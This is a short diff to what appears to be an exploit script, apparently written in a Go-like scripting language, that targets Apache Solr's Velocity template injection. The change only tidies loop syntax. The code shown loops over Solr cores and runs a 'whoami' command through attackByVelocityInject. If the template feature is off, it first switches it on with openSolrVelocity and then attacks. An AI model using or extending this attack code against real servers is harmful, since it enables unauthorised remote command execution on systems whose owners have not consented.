@@ -139,7 +139,7 @@ main := func() {
     }
 
     //if the solr velocity template functions has been openned
-    for core,v in cores {
+    for core in cores {
 
         response := attackByVelocityInject(core,"whoami")
 
@@ -157,7 +157,7 @@ main := func() {
     }
 
     //solr velocity template functions has not been openned ,try to open it then attack
-     for core,v in cores {
+     for core in cores {
             openSolrVelocity(core)
             response := attackByVelocityInject(core,"whoami")
 
